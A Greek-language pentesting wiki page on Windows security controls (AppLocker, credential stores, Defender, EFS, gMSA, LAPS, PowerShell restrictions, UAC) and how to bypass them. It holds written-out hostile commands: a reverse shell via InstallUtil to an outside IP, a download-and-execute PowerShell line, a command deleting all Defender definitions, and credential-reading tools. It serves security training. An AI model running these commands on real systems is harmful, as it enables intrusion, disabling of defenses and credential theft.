# Έλεγχοι ασφαλείας των Windows

{{#include ../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια λίστα επιτρεπόμενων εφαρμογών είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Στόχος είναι η προστασία του περιβάλλοντος από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση της Microsoft για τη δημιουργία λίστας επιτρεπόμενων εφαρμογών** και παρέχει στους διαχειριστές συστημάτων έλεγχο σχετικά με το **ποιες εφαρμογές και ποια αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** σε εκτελέσιμα αρχεία, scripts, αρχεία εγκατάστασης των Windows, DLLs, packaged apps και packed app installers.\
Είναι συνηθισμένο οι οργανισμοί να **αποκλείουν τα cmd.exe και PowerShell.exe** και την πρόσβαση εγγραφής σε συγκεκριμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις βρίσκονται στη blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Το `Test-AppLockerPolicy` αξιολογεί υποψήφια αρχεία για μια συγκεκριμένη ταυτότητα σύμφωνα με μια πολιτική AppLocker. Ελέγξτε τον λογαριασμό του οποίου το token θα εκτελέσει το payload, επειδή οι κανόνες μπορούν να στοχεύουν χρήστες ή groups· το `Get-AppLockerFileInformation` είναι επίσης χρήσιμο για την εξέταση της διαδρομής, του hash και των μεταδεδομένων publisher στα οποία ενδέχεται να αντιστοιχούν οι κανόνες.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Αυτό το registry path περιέχει τις διαμορφώσεις και τις policies που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο ελέγχου του τρέχοντος συνόλου κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **Writable folders** για bypass του AppLocker Policy: Εάν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα στα `C:\Windows\System32` ή `C:\Windows`, υπάρχουν **writable folders** που μπορείτε να χρησιμοποιήσετε για να κάνετε **bypass αυτού**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Τα συνήθως **έμπιστα** binaries [**"LOLBAS's"**](https://lolbas-project.github.io/) μπορούν επίσης να φανούν χρήσιμα για την παράκαμψη του AppLocker.
- Οι **κακογραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν**
- Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με το όνομα `allowed`** οπουδήποτε και θα επιτρέπεται.
- Οι οργανισμοί συχνά επικεντρώνονται επίσης στον **αποκλεισμό του εκτελέσιμου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων αρχείων του PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), όπως `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- Η **επιβολή DLL ενεργοποιείται πολύ σπάνια**, λόγω του πρόσθετου φορτίου που μπορεί να επιφέρει σε ένα σύστημα και του όγκου των δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σταματήσει να λειτουργεί. Επομένως, η χρήση **DLL ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Αποθήκευση Credentials

### Security Accounts Manager (SAM)

Τα local credentials βρίσκονται σε αυτό το αρχείο και τα passwords είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **credentials** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του subsystem για λόγους Single Sign-On.\
Το **LSA** διαχειρίζεται την τοπική **security policy** (πολιτική password, permissions χρηστών...), το **authentication**, τα **access tokens**...\
Το LSA είναι αυτό που θα **ελέγξει** τα παρεχόμενα credentials μέσα στο αρχείο **SAM** (για local login) και θα **επικοινωνήσει** με τον **domain controller** για να κάνει authenticate έναν domain user.

Τα **credentials** **αποθηκεύονται** μέσα στη **διεργασία LSASS**: tickets Kerberos, NT και LM hashes, passwords που αποκρυπτογραφούνται εύκολα.

### LSA secrets

Το LSA μπορεί να αποθηκεύσει στον δίσκο ορισμένα credentials:

- Το password του computer account του Active Directory (μη προσβάσιμος domain controller).
- Passwords των accounts των Windows services
- Passwords για scheduled tasks
- Περισσότερα (password του IIS applications...)

### NTDS.dit

Είναι η database του Active Directory. Υπάρχει μόνο στους Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Μπλοκάρει** κοινά pentesting tools όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για **παράκαμψη αυτών των protections**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender**, μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να το κάνετε enumerate, μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)

Το EFS προστατεύει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **File Encryption Key (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στο **alternative data stream** $EFS του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη χρησιμοποιείται για την αποκρυπτογράφηση του FEK από το stream $EFS. Περισσότερες λεπτομέρειες βρίσκονται [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς ενέργεια από τον χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε ένα file system που δεν υποστηρίζει EFS, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα κρυπτογραφημένα αρχεία που αποστέλλονται μέσω δικτύου με το πρωτόκολλο SMB/CIFS αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης παρέχει **διαφανή πρόσβαση** στα κρυπτογραφημένα αρχεία για τον κάτοχό τους. Ωστόσο, η απλή αλλαγή του password του κατόχου και η σύνδεση δεν θα επιτρέψουν την αποκρυπτογράφηση.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί ένα συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για την πρόσβαση στο FEK.
- Η αυτόματη αποκρυπτογράφηση πραγματοποιείται υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα στον κάτοχό τους χωρίς επιπλέον ενέργειες.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτή την **υπηρεσία**, ελέγχοντας αν υπάρχει το path:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε τις εντολές `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και να **αποκρυπτογραφήσετε** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Όντας Authority System

Αυτή η προσέγγιση απαιτεί ο **victim user** να **εκτελεί** μια **διεργασία** στον host. Αν ισχύει αυτό, από μια συνεδρία `meterpreter` μπορείτε να κάνετε impersonate το process token του χρήστη (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε να κάνετε `migrate` στη διεργασία του χρήστη.

#### Γνωρίζοντας το Password του χρήστη

Το Mimikatz μπορεί να εισαγάγει το certificate και το private key του χρήστη και στη συνέχεια να τα χρησιμοποιήσει για την αποκρυπτογράφηση αρχείων που προστατεύονται από το EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση service accounts σε IT infrastructures. Σε αντίθεση με τα παραδοσιακά service accounts, στα οποία συχνά είναι ενεργοποιημένη η ρύθμιση "**Password never expire**", τα gMSAs προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Automatic Password Management**: Τα gMSAs χρησιμοποιούν ένα σύνθετο password 240 χαρακτήρων, το οποίο αλλάζει αυτόματα σύμφωνα με την πολιτική του domain ή του computer. Αυτή η διαδικασία πραγματοποιείται από το Key Distribution Service (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις password.
- **Enhanced Security**: Αυτοί οι λογαριασμοί δεν επηρεάζονται από lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, ενισχύοντας την ασφάλειά τους.
- **Multiple Host Support**: Τα gMSAs μπορούν να χρησιμοποιούνται από πολλαπλούς hosts, γεγονός που τα καθιστά ιδανικά για services που εκτελούνται σε πολλούς servers.
- **Scheduled Task Capability**: Σε αντίθεση με τα managed service accounts, τα gMSAs υποστηρίζουν την εκτέλεση scheduled tasks.
- **Simplified SPN Management**: Το σύστημα ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα sAMaccount details ή στο DNS name του computer, απλοποιώντας τη διαχείριση SPN.

Τα passwords των gMSAs αποθηκεύονται στην LDAP property _**msDS-ManagedPassword**_ και επαναφέρονται αυτόματα κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτό το password, ένα encrypted data blob γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους administrators και τους servers στους οποίους είναι εγκατεστημένα τα gMSAs, διασφαλίζοντας ένα ασφαλές περιβάλλον. Για την πρόσβαση σε αυτές τις πληροφορίες απαιτείται ασφαλής σύνδεση, όπως LDAPS, ή η σύνδεση πρέπει να είναι authenticated με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Μπορείτε να διαβάσετε αυτό το password με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Επίσης, δείτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με τον τρόπο εκτέλεσης μιας **NTLM relay attack** για την **ανάγνωση** του **κωδικού πρόσβασης** του **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Κατά την enumeration, διακρίνετε το **legacy Microsoft LAPS** από την εγγενή υλοποίηση **Windows LAPS**. Το Windows LAPS κυκλοφόρησε στις ενημερώσεις των Windows της 11ης Απριλίου 2023 και μπορεί να δημιουργεί backup του κωδικού πρόσβασης ενός διαχειριστή local σε **Windows Server Active Directory** ή **Microsoft Entra ID**. Σε deployments που βασίζονται σε AD, μπορεί επιπλέον να κρυπτογραφεί κωδικούς πρόσβασης, να διατηρεί ιστορικό κρυπτογραφημένων κωδικών πρόσβασης και να διαχειρίζεται τον κωδικό πρόσβασης DSRM ενός domain controller. Το downloadable legacy MSI είναι deprecated σε νεότερες εκδόσεις των Windows, αν και το Windows LAPS μπορεί να λειτουργεί σε legacy-emulation mode.<sup>[[6]](#references)</sup>

Επειδή το legacy Microsoft LAPS και το Windows LAPS είναι ξεχωριστές υλοποιήσεις, εντοπίστε ποια από τις δύο έχει γίνει deploy πριν εφαρμόσετε attacks που αφορούν συγκεκριμένα attributes ή cmdlets. Η συνδεδεμένη σελίδα καλύπτει discovery, ACL enumeration, retrieval, manipulation της expiration και offline recovery, χωρίς να επαναλαμβάνει εδώ αυτές τις διαδικασίες.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως τον αποκλεισμό COM objects, την έγκριση μόνο εγκεκριμένων τύπων .NET, workflows που βασίζονται σε XAML, PowerShell classes και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Στα τρέχοντα Windows αυτό το Bypass δεν θα λειτουργήσει, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το κάνετε compile ίσως χρειαστεί** **να** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> προσθέσετε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **να αλλάξετε το project σε .Net4.5**.

#### Άμεσο bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Αντίστροφο shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να κάνετε bypass στο constrained mode. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Πολιτική εκτέλεσης PS

Από προεπιλογή έχει οριστεί σε **restricted.** Κύριοι τρόποι για να κάνετε bypass σε αυτήν την πολιτική:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την authentication χρηστών.

Το SSPI είναι υπεύθυνο για την εύρεση του κατάλληλου protocol για δύο machines που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος είναι το Kerberos. Στη συνέχεια, το SSPI διαπραγματεύεται ποιο authentication protocol θα χρησιμοποιηθεί. Αυτά τα authentication protocols ονομάζονται Security Support Provider (SSP), βρίσκονται μέσα σε κάθε Windows machine με τη μορφή DLL και και οι δύο machines πρέπει να υποστηρίζουν το ίδιο, ώστε να μπορούν να επικοινωνήσουν.

### Main SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, password με τη μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του protocol που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το default)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει several methods ή μόνο μία.

## UAC - User Account Control

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι ένα feature που ενεργοποιεί ένα **consent prompt για elevated activities**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Παράκαμψη του AppLocker και του PowerShell constrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [πώς να κάνετε decrypt αρχεία EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying για gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 τρόποι παράκαμψης του PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Χρήση των AppLocker Windows PowerShell cmdlets](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Επισκόπηση του Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
